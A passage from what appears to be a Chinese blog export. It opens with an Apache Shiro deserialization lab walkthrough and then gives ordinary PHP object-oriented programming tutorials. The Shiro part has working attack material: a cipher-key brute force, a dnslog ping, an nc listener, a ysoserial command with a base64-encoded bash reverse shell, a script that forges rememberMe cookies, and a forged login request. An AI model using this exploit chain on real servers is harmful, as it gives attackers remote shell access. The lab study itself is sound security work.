POC检查key 1python shiro_exploit.py -u http:&#x2F;&#x2F;127.0.0.1:8080 12345678910111213try CipherKey :5aaC5qKm5oqA5pyvAAAAAA&#x3D;&#x3D;generator payload done.send payload ok.checking.....checking.....checking.....checking.....try CipherKey :kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;generator payload done.send payload ok.checking.....vulnerable:True url:http:&#x2F;&#x2F;127.0.0.1:8080 CipherKey:kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D; 检查gadget 1python shiro_exploit.py -u http:&#x2F;&#x2F;127.0.0.1:8080 -t 3 -p &quot;ping -c 2 http:&#x2F;&#x2F;ax18gp.dnslog.cn&quot; -k &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot; 监听本地端口 1nc -lvp 1234 通过ysoserial中JRMP监听模块，监听6666端口并执行反弹shell命令。 Java base64编码http://www.jackson-t.ca/runtime-exec-payloads.html。 1java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39; CommonsCollections4、CommonsCollections2、CommonsCollections5都可以试试。 使用shiro.py 生成Payload 12➜ shiro python shiro_poc_rember.py 127.0.0.1:6666rememberMe&#x3D;7sf6Aww8S9KEd7uQj2cX60H5BuTt8lt4IoELDzh2pXjkZENeSYWA7WNywqixdac4AY&#x2F;gNom7n+T0AfMgWvjob0njwuaOy4J3tl85oO0uUI+PUQ7IP9w3WYBtn50rRlIkckOfE8e64ps0528OCA6rSU2BkPbOvjpHgAPx8vzopDSGO85t03fBpX8nwzgR8QQyJ&#x2F;R&#x2F;6O7W85RTTxLyGLy9mYwoxYlHScecW&#x2F;jg&#x2F;fgDczxWIooKVKJPLiuCGozp7VddvPmUxrXV5YkzdYCTSXl6087aqul1yAbp0s1bGhVDLCdnwAeZgstLJFKrm2RauJEiM5gz5tkjlBmDZbWqXepaAybgFOgX2ya8xTFM5gN7XIgx8l8Mq2AtvC5gbg3oS1xtofOErw1Xx3kFEdow8AcvzQ&#x3D;&#x3D; 1234567891011121314151617181920import sysimport uuidimport base64import subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command): popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;&#x2F;Users&#x2F;apple&#x2F;Documents&#x2F;steady-sec&#x2F;shiro&#x2F;ysoserial.jar&#39;, &#39;JRMPClient&#39;, command], stdout&#x3D;subprocess.PIPE) BS &#x3D; AES.block_size pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key &#x3D; base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;) iv &#x3D; uuid.uuid4().bytes encryptor &#x3D; AES.new(key, AES.MODE_CBC, iv) file_body &#x3D; pad(popen.stdout.read()) base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ &#x3D;&#x3D; &#39;__main__&#39;: payload &#x3D; encode_rememberme(sys.argv[1]) print &quot;rememberMe&#x3D;&#123;0&#125;&quot;.format(payload.decode()) 构造数据包，伪造cookie，发送Payload. 123456789101112131415POST &#x2F;doLogin HTTP&#x2F;1.1Host: 127.0.0.1:8080User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko&#x2F;20100101 Firefox&#x2F;81.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 53Origin: http:&#x2F;&#x2F;127.0.0.1:8080Connection: closeReferer: http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;login;jsessionid&#x3D;65E88136CDB707384CB4A4C27659B658Cookie: JSESSIONID&#x3D;65E88136CDB707384CB4A4C27659B658;rememberMe&#x3D;7sf6Aww8S9KEd7uQj2cX60H5BuTt8lt4IoELDzh2pXjkZENeSYWA7WNywqixdac4AY&#x2F;gNom7n+T0AfMgWvjob0njwuaOy4J3tl85oO0uUI+PUQ7IP9w3WYBtn50rRlIkckOfE8e64ps0528OCA6rSU2BkPbOvjpHgAPx8vzopDSGO85t03fBpX8nwzgR8QQyJ&#x2F;R&#x2F;6O7W85RTTxLyGLy9mYwoxYlHScecW&#x2F;jg&#x2F;fgDczxWIooKVKJPLiuCGozp7VddvPmUxrXV5YkzdYCTSXl6087aqul1yAbp0s1bGhVDLCdnwAeZgstLJFKrm2RauJEiM5gz5tkjlBmDZbWqXepaAybgFOgX2ya8xTFM5gN7XIgx8l8Mq2AtvC5gbg3oS1xtofOErw1Xx3kFEdow8AcvzQ&#x3D;&#x3D;Upgrade-Insecure-Requests: 1username&#x3D;admin&amp;password&#x3D;vulhub&amp;rememberme&#x3D;remember-me","categories":[{"name":"组件安全","slug":"组件安全","permalink":"http://s1eady.top/categories/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"组件安全","slug":"组件安全","permalink":"http://s1eady.top/tags/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"}]},{"title":"PHP开发学习--核心编程7","slug":"PHP核心编程7","date":"2020-01-05T18:12:34.000Z","updated":"2020-11-16T03:37:54.428Z","comments":true,"path":"2020/01/06/PHP核心编程7/","link":"","permalink":"http://s1eady.top/2020/01/06/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B7/","excerpt":"","text":"PHP核心编程7工厂设计模式什么是工厂设计模式根据传递不同的类名参数，返回不同类的对象； 工厂模式，就是生产各种的不同类的对象； 工厂模式，改变了在类外使用new关键字创建对象的方式，改成了在工厂类中创建类的对象。 在类的外部我们无法控制类的行为，但在类内部自己可以控制类的行为。 工厂设计模式的要求一般情况下，定义一个工厂类； 工厂类中的方法，应该是公共的静态的方法； 该方法功能：就是根据传递的不同参数，去创建不同的类实例； 实例：创建不同形状类的对象工厂类 123456789101112131415161718192021222324&lt;?php//定义形状工厂类：生产不同形状对象的工厂class Factory&#123; //公共的静态的创建不同类对象的方法 public static function getInstance($className) &#123; //根据传递的不同类名参数，返回不同类对象 switch($className) &#123; case &quot;Rectangle&quot;: return new Rectangle(); break; case &quot;Circle&quot;: return new Circle(); break; case &quot;Line&quot;: return new Line(); break; default: return null; &#125; &#125;&#125; 使用工厂类创建需要的类对象 1234567891011121314151617181920212223242526&lt;?php//类的自动加载spl_autoload_register(function($className)&#123; //构建类文件的路径 $filename = &quot;./libs/$className.class.php&quot;; //如果类文件存在，则包含 if(file_exists($filename)) &#123; echo $filename.&quot;&lt;br&gt;&quot;; require_once($filename); &#125;&#125;);//创建矩形对象$rectangle = Factory::getInstance(&quot;Rectangle&quot;);$rectangle-&gt;draw();echo &quot;&lt;hr&gt;&quot;;//创建圆形对象$circle = Factory::getInstance(&quot;Circle&quot;);$circle-&gt;draw();echo &quot;&lt;hr&gt;&quot;;//创建线段对象$line = Factory::getInstance(&quot;Line&quot;);$line-&gt;draw(); 变量序列化什么是变量序列化序列化是将变量转换为可保存或传输的字符串的过程； 反序列化就是在适当的时候把这个字符串再转化成原来的变量使用； 这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性； 序列化有利于存储或传递 PHP 的值，同时不丢失其类型和结构。 序列化函数serialize()描述：产生一个可存储的值的表示； 语法：string serialize ( mixed $value ) 参数：$value可以是任何类型，除了资源外； 返回：返回序列化之后的字符串，可以存储于任何地方。 123456789101112&lt;?php//数组变量序列化$arr = array( &#x27;db_host&#x27; =&gt; &#x27;localhost&#x27;, &#x27;db_user&#x27; =&gt; &#x27;root&#x27;, &#x27;db_pass&#x27; =&gt; &#x27;root&#x27;, &#x27;db_name&#x27; =&gt; &#x27;itcast&#x27;, );//序列化：将变量转成可保存的字符串$str = serialize($arr);//将序列化字符串，保存到记事本file_put_contents(&#x27;./1.txt&#x27;,$str); 反序列化函数unserialize()描述：从已存储的表示中创建 PHP 的值 语法：***\\*mixed unserialize ( string $str )\\**** 说明：对单一的已序列化的变量进行操作，将其转换回 PHP 的值。 参数：$str为序列化后的字符串； 返回：返回的是转换之后的值，可为 integer、float、string、array或 object。 如果传递的字符串不可序列化，则返回 FALSE，并产生一个 E_NOTICE。 12345678&lt;?php//反序列化：序列化字符串，还原成原始变量//读取记事本的数据$str = file_get_contents(&#x27;./1.txt&#x27;);//将序列化字符串，还原成变量$arr = unserialize($str);//打印变量print_r($arr); 对象序列化对象的序列化过程，与其它变量数据一样； 对象序列化的内容只能包含成员属性； 当序列化对象时，serialize()函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?php//定义一个数据库工具类class Db&#123; //私有的数据库配置信息 private $db_host; //主机名 private $db_user; //用户名 private $db_pass; //密码 private $db_name; //数据库名 private $charset; //字符集 private $link; //连接对象 //公共的构造方法：数据库对象初始化 public function __construct($config=array()) &#123; $this-&gt;db_host = $config[&#x27;db_host&#x27;]; $this-&gt;db_user = $config[&#x27;db_user&#x27;]; $this-&gt;db_pass = $config[&#x27;db_pass&#x27;]; $this-&gt;db_name = $config[&#x27;db_name&#x27;]; $this-&gt;charset = $config[&#x27;charset&#x27;]; //一个方法只做一件事 $this-&gt;connectDb(); //连接MySQL服务器 $this-&gt;selectDb(); //选择数据库 $this-&gt;setCharset(); //设置字符集 &#125; //私有的连接MySQL服务器方法 private function connectDb() &#123; if(!$this-&gt;link = @mysqli_connect($this-&gt;db_host, $this-&gt;db_user, $this-&gt;db_pass)) &#123; echo &quot;连接MySQL服务器失败！&quot;; die(); &#125; &#125; //私有的选择数据库的方法 private function selectDb() &#123; if(!mysqli_select_db($this-&gt;link, $this-&gt;db_name)) &#123; echo &quot;选择数据库&#123;$this-&gt;db_name&#125;失败！&quot;; die(); &#125; &#125; //私有的设置字符集 private function setCharset() &#123; mysqli_set_charset($this-&gt;link, $this-&gt;charset); &#125; //当对象序列化时，魔术方法__sleep()会自动调用 //在__sleep()中工作：清理不需要的属性 public function __sleep() &#123; //返回要序列化的对象属性的数组 return array(&#x27;db_host&#x27;,&#x27;db_user&#x27;,&#x27;db_pass&#x27;,&#x27;db_name&#x27;,&#x27;charset&#x27;); &#125;&#125;//创建数据库类的对象$arr = array( &#x27;db_host&#x27; =&gt; &#x27;localhost&#x27;, &#x27;db_user&#x27; =&gt; &#x27;root&#x27;, &#x27;db_pass&#x27; =&gt; &#x27;root&#x27;, &#x27;db_name&#x27; =&gt; &#x27;itcast&#x27;, &#x27;charset&#x27; =&gt; &#x27;utf8&#x27; );$db = new Db($arr);//将数据库对象序列化$str = serialize($db);//将对象序列化字符串保存到记事本file_put_contents(&#x27;./2.txt&#x27;,$str); 对象反序列化对象的反序列化过程，与其它变量数据一样； 当对象反序列化时，unserialize()函数会检查类中是否存在一个__wakeup()方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。 __wakeup() 经常用在反序列化操作中，进行一些初始化操作，例如重新建立数据库连接，或执行其它初始化操作。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;?php//定义一个数据库工具类class Db&#123; //私有的数据库配置信息 private $db_host; //主机名 private $db_user; //用户名 private $db_pass; //密码 private $db_name; //数据库名 private $charset; //字符集 private $link; //连接对象 //公共的构造方法：数据库对象初始化 public function __construct($config=array()) &#123; $this-&gt;db_host = $config[&#x27;db_host&#x27;]; $this-&gt;db_user = $config[&#x27;db_user&#x27;]; $this-&gt;db_pass = $config[&#x27;db_pass&#x27;]; $this-&gt;db_name = $config[&#x27;db_name&#x27;]; $this-&gt;charset = $config[&#x27;charset&#x27;]; //一个方法只做一件事 $this-&gt;connectDb(); //连接MySQL服务器 $this-&gt;selectDb(); //选择数据库 $this-&gt;setCharset(); //设置字符集 &#125; //私有的连接MySQL服务器方法 private function connectDb() &#123; if(!$this-&gt;link = @mysqli_connect($this-&gt;db_host, $this-&gt;db_user, $this-&gt;db_pass)) &#123; echo &quot;连接MySQL服务器失败！&quot;; die(); &#125; &#125; //私有的选择数据库的方法 private function selectDb() &#123; if(!mysqli_select_db($this-&gt;link, $this-&gt;db_name)) &#123; echo &quot;选择数据库&#123;$this-&gt;db_name&#125;失败！&quot;; die(); &#125; &#125; //私有的设置字符集 private function setCharset() &#123; mysqli_set_charset($this-&gt;link, $this-&gt;charset); &#125; //当对象序列化时，魔术方法__sleep()会自动调用 //在__sleep()中工作：清理不需要的属性 public function __sleep() &#123; //返回要序列化的对象属性的数组 return array(&#x27;db_host&#x27;,&#x27;db_user&#x27;,&#x27;db_pass&#x27;,&#x27;db_name&#x27;,&#x27;charset&#x27;); &#125; //当对象反序列化时，魔术方法__wakeup()会自动调用 //__wakeup()作用：对象初始化 public function __wakeup() &#123; $this-&gt;connectDb(); //连接MySQL服务器 $this-&gt;selectDb(); //选择数据库 $this-&gt;setCharset(); //设置字符集 &#125;&#125;//读取记事本的对象序列化字符串$str = file_get_contents(&#x27;./2.txt&#x27;);//对象反序列化$db = unserialize($str);//打印$db对象var_dump($db);","categories":[{"name":"PHP开发学习","slug":"PHP开发学习","permalink":"http://s1eady.top/categories/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"PHP开发学习","slug":"PHP开发学习","permalink":"http://s1eady.top/tags/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"}]},{"title":"PHP开发学习--核心编程6","slug":"PHP核心编程6","date":"2020-01-04T23:23:10.000Z","updated":"2020-11-16T03:37:16.176Z","comments":true,"path":"2020/01/05/PHP核心编程6/","link":"","permalink":"http://s1eady.top/2020/01/05/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B6/","excerpt":"","text":"PHP核心编程6最终类和最终方法Final关键字修饰的类，就是最终类； Final关键字修饰的方法，就是最终方法； 最终类：该类只能实例化，不能被继承。该类十分完善了，不需要升级和扩展。 最终方法：该方法可以被继承，但不能重写。该方法十分完善了，不需要重写了。 抽象类和抽象方法概述abstract关键字修饰的类，就是抽象类； abstract关键字修饰的方法，就是抽象方法； 抽象类：该类不能直接实例化，必须先继承后再实例化。常用在基础类。 抽象方法：方法必须先继承后重写。 抽象方法就是方法的命名规范、命名规则、方法大纲，也可以理解为一种监督机制。 所有的抽象方法都必须重写，少一个都不行。 抽象方法没有方法体，必须在子类重写后，再定义方法体。 如果一类中有一个抽象方法，该类必须是抽象类。 抽象方法权限不能是private，因为要先继承再重写。 在PHP7中，抽象方法可以是成员方法，也可以是静态方法。 抽象类中，可以包含其它成员：常量、成员属性、成员方法、静态属性、静态方法 实例：抽象类和抽象方法实例演示123456789101112131415161718192021222324252627&lt;?php//定义抽象学生类：子类方法的目录大纲abstract class Student&#123; const TITLE = &quot;PHP第69期就业班&quot;; //定义成员的抽象方法 abstract protected function showInfo($a,$b); //定义静态的抽象方法 abstract static public function readMe();&#125;//定义传智学生类，并继承学生类final class ItcastStudent extends Student&#123; //重写showInfo()抽象方法 public function showInfo($name,$age)&#123; echo &quot;&#123;$name&#125;的年龄是&#123;$age&#125;岁！&lt;br&gt;&quot;; &#125; //重写readMe()抽象方法 public static function readMe()&#123; echo self::TITLE; &#125;&#125;//创建传智学生类对象$obj = new ItcastStudent;$obj-&gt;showInfo(&quot;张三四&quot;,24);$obj-&gt;readMe(); 接口技术接口的基本概念接口就是特殊的抽象类。 PHP 类是单继承，也就是不支持多继承。 当一个类需要多个类的功能时，单继承就无能为力了，为此 PHP 引入了类的接口技术。 多人合作开发项目时，需要规范各个功能的名称，就需要用到接口技术。 接口就是一种标准，一种规范。类的功能实现，按照标准接口实现即可； 接口定义和实现要点interface关键字定义接口； Implements关键字用来实现接口； 接口中方法权限必须是public； 接口中方法默认是抽象的，所以不需要在方法名前面加 abstract ； 接口中方法可以是成员方法，也可以是静态方法； 接口中也可以定义常量，但常量不能重写； 类可以实现(implements)多个接口（相当于把多个功能集于一身，如手机实现了小灵通、MP3、MP4的功能）； 接口也可以继承(extends)接口，类可以继承(extends)类，但是类只能实现(implements)接口。 实例：接口的定义和实现演示123456789101112131415161718192021222324252627282930313233&lt;?php//定义第1个接口InterAinterface InterA&#123; const TITLE = &quot;PHP第69期就业班&quot;; //定义一个成员抽象方法 public function showInfo($a,$b);&#125;//定义第2个接口InterBinterface InterB&#123; //定义一个静态抽象方法 public static function readMe();&#125;//定义学生类，并实现接口功能class Student implements InterA,InterB&#123; //重写showInfo()抽象方法 public function showInfo($name,$age)&#123; echo &quot;&#123;$name&#125;的年龄是&#123;$age&#125;岁！&lt;br&gt;&quot;; &#125; //重写readMe()抽象方法 public static function readMe()&#123; echo self::TITLE; &#125;&#125;//创建学生类对象$obj = new Student();$obj-&gt;showInfo(&#x27;张三四&#x27;,26);$obj-&gt;readMe(); 实例：创建手机类并实现小灵通接口、MP3接口、MP4接口12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?php//定义小灵通的接口interface XiaoLingTong&#123; //定义打电话的抽象方法 public function tel();&#125;//定义Mp3接口interface Mp3&#123; //定义听音乐的抽象方法 public function music();&#125;//定义Mp4接口，并继承Mp3接口interface Mp4 extends Mp3&#123; //定义看电影的抽象方法 public function video();&#125;//定义手机类，并实现以上所有接口功能class Mobile implements XiaoLingTong,Mp4&#123; //重写tel()抽象方法 public function tel()&#123; echo &quot;正在打电话！&lt;br&gt;&quot;; &#125; //重写music()抽象方法 public function music()&#123; echo &quot;正在听音乐！&lt;br&gt;&quot;; &#125; //重写video()抽象方法 public function video()&#123; echo &quot;正在看电影！&lt;br&gt;&quot;; &#125; //添加打游戏方法 public function game()&#123; echo &quot;正在打游戏！&quot;; &#125;&#125;//创建手机类对象$obj = new Mobile();$obj-&gt;tel();$obj-&gt;music();$obj-&gt;video();$obj-&gt;game(); 类的自动加载为什么需要类的自动加载很多开发者写面向对象的应用程序时，对每个类的定义，都建立一个独立的 PHP 类文件，方便类文件的统一管理，这无可厚非。但一个很大的烦恼是，不得不在每个脚本开头，写一个长长的包含文件列表（每个类一个文件）。这样一来，就增加了很多负担、占用了很多的内存，对于后期维护也不方便。 解决方案：按需要加载类文件，而不是把所有类全部包含进来。 类文件的命名规范一个类要单独定义成一个独立的类文件； 类文件扩展名，要以”.class.php”结尾，是一种约定，不是必须的； 类文件主名，要与类名一致； 例如：Db.class.php、UserController.class.php、UserModel.class.php 类的自定义加载函数：spl_autoload_register()PHP7以下版本，使用__autoload()实现类的自动加载； PHP7以上版本，使用spl_autoload_register()实现类的自动加载。 当试图使用未定义的类时spl_autoload_register自动调用，使用一个类有以下几种情况： 使用new关键字创建不存在类的对象时，spl_autoload_register自动调用；例如：$obj = new Student() 当使用静态化方式访问一个不存在的类时，spl_autoload_register自动调用，例如：Student::show()； 当继承一个不存在的类时，spl_autoload_register自动调用，例如：class Stu extends Parent{} 当实现一个不存在的接口时，spl_autoload_register自动调用，例如：class Stu implements Inter 语法格式描述：将函数注册到SPL(标准PHP库)的__autoload函数队列中。如果该队列中的函数尚未激活，则激活它们。它实际上创建了 autoload 函数的队列，按定义时的顺序逐个执行。 语法： bool spl_autoload_register ([ callback $autoload_function ] ) 参数：$autoload_function，欲注册的自动装载函数，可以是匿名函数，也可以是字符串的函数名称。$autoload_function有一个传递过来的类名形参，用于在函数中构建类文件路径。 返回：成功时返回 TRUE， 或者在失败时返回 FALSE。 使用普通函数作为参数 使用匿名函数作为参数 对象克隆什么是对象克隆？如果已存在了一个对象，而还想再创建一个新对象，并且，两个对象的属性值不一样，或者属性比原来多 ，怎么实现呢？ $obj2 = $obj1 无法实现！ $obj2 = $obj1，这不是复制对象，而是将$obj1和$obj2指向了同一个对象地址。 创建新对象有两种方式：a. 使用new关键字； b. 使用 clone 关键字 实例：对象克隆的演示1234567891011121314151617181920&lt;?php//定义一个学生类class Student&#123; private $name = &quot;steady&quot;; private $age = 24; //克隆方法：当对象克隆完成时，自动调用的方法 public function __clone() &#123; $this-&gt;name = &quot;steady2&quot;; $this-&gt;age = 29; &#125;&#125;//创建学生类对象$obj1 = new Student();//克隆对象：将$obj1克隆一份，传给$obj2//克隆对象，是两个独立的新对象$obj2 = clone $obj1;var_dump($obj1,$obj2); 输出 12345678/Applications/MAMP/htdocs/phpinfo.php:20:object(Student)[1] private &#x27;name&#x27; =&gt; string &#x27;steady&#x27; (length=6) private &#x27;age&#x27; =&gt; int 24/Applications/MAMP/htdocs/phpinfo.php:20:object(Student)[2] private &#x27;name&#x27; =&gt; string &#x27;steady2&#x27; (length=7) private &#x27;age&#x27; =&gt; int 29 实例：魔术方法__clone()在克隆对象中的使用对象遍历foreach既可以遍历数组元素，也可以遍历对象属性。 123456789101112131415161718192021222324252627&lt;?php//定义一个学生类class Student&#123; protected $name = &quot;张三丰&quot;; private $age = 24; public $edu = &quot;大专&quot;; //在类内遍历对象属性 public function showInfo() &#123; //在类外遍历对象的属性 echo &quot;&lt;h2&gt;在类内遍历对象的属性&lt;/h2&gt;&quot;; foreach($this as $key=&gt;$value) &#123; echo &quot;\\$this-&gt;&#123;$key&#125; = &#123;$value&#125;&lt;br&gt;&quot;; &#125; &#125;&#125;//创建学生类对象$obj = new Student();$obj-&gt;showInfo();//在类外遍历对象的属性echo &quot;&lt;h2&gt;在类外遍历对象的属性&lt;/h2&gt;&quot;;foreach($obj as $key=&gt;$value)&#123; echo &quot;\\$obj-&gt;&#123;$key&#125; = &#123;$value&#125;&lt;br&gt;&quot;;&#125; 面向对象的设计模式什么是对象设计模式？设计模式（Design pattern）是一套被反复使用、多数人知晓的、经过分类编目的、代码设计经验的总结。使用设计模式是为了可重用代码、让代码更容易被他人理解、保证代码可靠性。 常用的设计模式有哪些？单例设计模式：一个类只能创建一个实例对象，不管用什么办法都无法创建第2个对象； 工厂设计模式：生产不同类对象的工厂； 策略设计模式：定义一组算法，将每个算法都封装起来，并且使它们之间可以互换。 观察者设计模式：定义对象间一种一对多的依赖关系，使得每当一个对象改变状态，则所有依赖于它的对象都会得到通知并被自动更新。 单例设计模式的要求(三私一公)一私：私有的静态的保存对象的属性。 一私：私有的构造方法，阻止类外new对象。 一私：私有的克隆方法，阻止类外clone对象。 一公：公共的静态的创建对象的方法。 实例：单例设计模式演示123456789101112131415161718192021222324252627&lt;?php//单例设计模式的核心代码class Db &#123; //私有的静态的保存对象的属性 private static $obj = null; //私有的构造方法：阻止类外new对象 private function __construct()&#123; &#125; //私有的克隆方法：阻止类外clone对象 private function __clone()&#123;&#125; //公共的静态的创建对象的方法 public static function getInstance()&#123; //判断当前对象是否存在 if(!self::$obj instanceof self) &#123; //如果对象不存在，创建并保存它 self::$obj = new self(); &#125; //返回对象 return self::$obj; &#125;&#125;//创建数据库类的对象$db1 = Db::getInstance();$db2 = Db::getInstance();var_dump($db1,$db2); 综合案例：学生信息管理系统数据库工具类数据库工具类遵循单例模式，三私–私有对象、私有属性、私有构造方法和克隆方法，一公–公共方法用来生成对象。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157&lt;?php//定义最终的单例的数据库工具类class Db&#123; //私有的静态的保存对象的属性 private static $obj = null; //私有的数据库配置信息 private $db_host; //主机名 private $db_user; //用户名 private $db_pass; //密码 private $db_name; //数据库名 private $charset; //字符集 private $link; //连接对象 //私有的构造方法：阻止类外new对象 private function __construct($config=array()) &#123; $this-&gt;db_host = $config[&#x27;db_host&#x27;]; $this-&gt;db_user = $config[&#x27;db_user&#x27;]; $this-&gt;db_pass = $config[&#x27;db_pass&#x27;]; $this-&gt;db_name = $config[&#x27;db_name&#x27;]; $this-&gt;charset = $config[&#x27;charset&#x27;]; $this-&gt;connectDb(); //连接MySQL服务器 $this-&gt;selectDb(); //选择数据库 $this-&gt;setCharset();//设置字符集 &#125; //私有的克隆方法：阻止类外clone对象 private function __clone()&#123;&#125; //公共的静态的创建对象的方法 public static function getInstance($config=array()) &#123; //判断当前对象是否存在 if(!self::$obj instanceof self) &#123; //如果对象不存在，创建并保存它 self::$obj = new self($config); &#125; //返回对象 return self::$obj; &#125; //私有的连接MySQL服务器方法 private function connectDb() &#123; if(!$this-&gt;link = @mysqli_connect($this-&gt;db_host, $this-&gt;db_user, $this-&gt;db_pass)) &#123; echo &quot;连接MySQL服务器失败！&quot;; die(); &#125; &#125; //私有的选择数据库的方法 private function selectDb() &#123; if(!mysqli_select_db($this-&gt;link, $this-&gt;db_name)) &#123; echo &quot;选择数据库&#123;$this-&gt;db_name&#125;失败！&quot;; die(); &#125; &#125; //私有的设置字符集 private function setCharset() &#123; mysqli_set_charset($this-&gt;link, $this-&gt;charset); &#125; //公共的执行SQL语句的方法：insert、update、delete、set、drop等 //执行成功返回true，执行失败返回false public function exec($sql) &#123; //例如：update student set salary=salary+500 where id=5 //将SQL语句转成全小写 $sql = strtolower($sql); //判断是不是SELECT语句 if(substr($sql,0,6)==&#x27;select&#x27;) &#123; echo &quot;不能执行SELECT语句！&quot;; die(); &#125; //返回执行的结果(布尔值) return mysqli_query($this-&gt;link, $sql); &#125; //私有的执行SQL语句的方法：select //执行成功返回结果集对象，执行失败返回false private function query($sql) &#123; //例如：SELECT * FROM student //将SQL语句转成全小写 $sql = strtolower($sql); //判断是不是SELECT语句 if(substr($sql,0,6)!=&#x27;select&#x27;) &#123; echo &quot;不能执行非SELECT语句！&quot;; die(); &#125; //返回执行的结果(结果集对象) return mysqli_query($this-&gt;link, $sql); &#125; //公共的获取单行数据的方法 public function fetchOne($sql,$type=3) &#123; //执行SQL语句，并返回结果集对象 $result = $this-&gt;query($sql); //定义返回数组类型的常量 $types = array( 1 =&gt; MYSQLI_NUM, 2 =&gt; MYSQLI_BOTH, 3 =&gt; MYSQLI_ASSOC, ); //返回一维数组 return mysqli_fetch_array($result, $types[$type]); &#125; //公共的获取多行数据的方法 public function fetchAll($sql, $type=3) &#123; //执行SQL语句，并返回结果集对象 $result = $this-&gt;query($sql); //定义返回数组类型的常量 $types = array( 1 =&gt; MYSQLI_NUM, 2 =&gt; MYSQLI_BOTH, 3 =&gt; MYSQLI_ASSOC, ); //返回二维数组 return mysqli_fetch_all($result, $types[$type]); &#125; //获取记录数 public function rowCount($sql) &#123; //执行SQL语句，并返回结果集对象 $result = $this-&gt;query($sql); //返回记录数 return mysqli_num_rows($result); &#125; //公共的析构方法 public function __destruct() &#123; mysqli_close($this-&gt;link); //断开MySQL连接 &#125;&#125; 数据库连接文件123456789101112131415161718&lt;?php//类的自动加载spl_autoload_register(function($className)&#123; //构建类文件的路径 $filename = &quot;./libs/$className.class.php&quot;; //如果类文件存在，则包含 if(file_exists($filename)) require_once($filename);&#125;);//创建数据库类的对象$arr = array( &#x27;db_host&#x27; =&gt; &#x27;127.0.0.1&#x27;, &#x27;db_user&#x27; =&gt; &#x27;root&#x27;, &#x27;db_pass&#x27; =&gt; &#x27;root&#x27;, &#x27;db_name&#x27; =&gt; &#x27;test&#x27;, &#x27;charset&#x27; =&gt; &#x27;utf8&#x27; );$db = Db::getInstance($arr); 显示学生信息文件连接数据库，取出数据，通过前端输出数据。 1234567891011121314151617181920&lt;?php//包含连接数据库的公共文件require_once(&quot;./conn.php&quot;);//每页显示条数$pagesize = 10;//获取当前页码和计算开始行号$page = isset($_GET[&#x27;page&#x27;]) ? $_GET[&#x27;page&#x27;] : 1;$startrow = ($page-1)*$pagesize;//获取总记录数和计算总页数$sql = &quot;SELECT * FROM student&quot;;$records = $db-&gt;rowCount($sql);$pages = ceil($records/$pagesize);//构建分页查询的SQL语句$sql = &quot;SELECT * FROM student ORDER BY id DESC LIMIT &#123;$startrow&#125;,&#123;$pagesize&#125;&quot;;//获取多行数据$arrs = $db-&gt;fetchAll($sql);?&gt; 1234567891011121314151617181920212223242526272829303132333435&lt;div style=&quot;text-align: center;padding-bottom:10px;&quot;&gt; &lt;h2&gt;学生信息管理中心&lt;/h2&gt; &lt;a href=&quot;&quot;&gt;添加学生&lt;/a&gt; 共有&lt;font color=&#x27;red&#x27;&gt;&lt;?php echo $records?&gt;&lt;/font&gt;个学生&lt;/div&gt;&lt;table width=&#x27;600&#x27; border=&#x27;1&#x27; bordercolor=&#x27;#ccc&#x27; rules=&quot;all&quot; cellpadding=&quot;5&quot; align=&quot;center&quot;&gt; &lt;tr bgcolor=&#x27;#f0f0f0&#x27;&gt; &lt;th&gt;编号&lt;/th&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;性别&lt;/th&gt; &lt;th&gt;年龄&lt;/th&gt; &lt;th&gt;学历&lt;/th&gt; &lt;th&gt;工资&lt;/th&gt; &lt;th&gt;奖金&lt;/th&gt; &lt;th&gt;籍贯&lt;/th&gt; &lt;th&gt;操作选项&lt;/th&gt; &lt;/tr&gt; &lt;?php //循环二维数组 foreach($arrs as $arr)&#123; ?&gt; &lt;tr align=&quot;center&quot;&gt; &lt;td&gt;&lt;?php echo $arr[&#x27;id&#x27;]?&gt;&lt;/td&gt; &lt;td&gt;&lt;?php echo 